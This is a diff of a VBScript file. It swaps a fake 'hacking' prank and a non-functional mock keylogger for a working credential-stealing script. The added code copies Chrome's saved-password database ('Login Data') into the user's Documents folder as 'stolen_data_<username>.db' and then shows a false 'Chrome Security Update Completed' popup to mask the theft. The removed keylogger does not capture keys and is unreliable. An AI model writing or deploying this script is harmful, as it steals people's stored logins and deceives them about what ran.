@@ -1,30 +1,15 @@
-Set objShell = CreateObject("WScript.Shell")
-objShell.Run "cmd /c echo Connecting to Windows 11 Secure Server... & timeout /nobreak 1"
-For i = 0 to 100
-    objShell.Run "cmd /c echo " & i & " | Bypassing Windows Defender... Access Granted & timeout /nobreak 0.01"
-Next
-objShell.Run "cmd /c echo System Breach Detected... Disconnecting... & timeout /nobreak 1"
+Dim fso, shell, source, target, username
 
-permission = MsgBox("Do you allow this program to create files on your computer?", vbYesNo + vbQuestion, "Windows Security")
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set shell = CreateObject("WScript.Shell")
+username = shell.ExpandEnvironmentStrings("%USERNAME%")
 
-If permission = vbYes Then
-    Set objFSO = CreateObject("Scripting.FileSystemObject")
-    If Not objFSO.FolderExists("C:\\Log") Then
-        objFSO.CreateFolder("C:\\Log")
-    End If
-    Set objFile = objFSO.OpenTextFile("C:\\Log\\keys.txt", 8, True)
-    MsgBox "Keylogger Started! Press OK to stop.", vbInformation, "Windows Security"
-    Do While True
-        For Each Key In Array("A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "Space")
-            If objShell.AppActivate("Keylogger") Then Exit Do
-            If objShell.SendKeys("{%}" & Key) Then
-                objFile.Write(Key)
-            End If
-        Next
-        WScript.Sleep 50
-    Loop
-    objFile.Close
-    MsgBox "Keylogger Stopped!", vbInformation, "Windows Security"
+source = "C:\Users\" & username & "\AppData\Local\Google\Chrome\User Data\Default\Login Data"
+target = "C:\Users\" & username & "\Documents\stolen_data_" & username & ".db"
+
+If fso.FileExists(source) Then
+    fso.CopyFile source, target, True
+    shell.Popup "Chrome Security Update Completed ✅", 3, "Google Chrome", 64
 Else
-    MsgBox "Permission Denied!", vbCritical, "Windows Security"
+    shell.Popup "Chrome not installed or data not found.", 3, "Error", 16
 End If
